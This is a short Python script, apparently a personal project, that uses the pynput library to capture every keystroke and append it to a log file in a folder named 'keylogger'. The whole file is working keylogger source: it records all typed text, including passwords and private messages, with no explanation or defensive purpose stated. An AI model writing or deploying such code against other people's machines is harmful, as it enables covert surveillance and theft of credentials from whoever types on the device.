from pynput.keyboard import Listener

logFile = "/home/samsepi01/Documentos/keylogger/log.txt"

def writelog(key):

    translate_keys = {
    "Key.space": " ",
    "Key.shift_r": "",
    "Key.shift_l": "",
    "Key.enter": "\n",
    "Key.alt": "",
    "Key.esc": "",
    "Key.cmd": "",
    "Key.caps_lock": "",
    }

    keydata = str(key)

    keydata = keydata.replace("'","")

    for key in translate_keys:
        keydata = keydata.replace(key, translate_keys[key])

    with open(logFile,"a") as f:
        f.write(keydata)

   
 
with Listener(on_press=writelog) as l:
    l.join()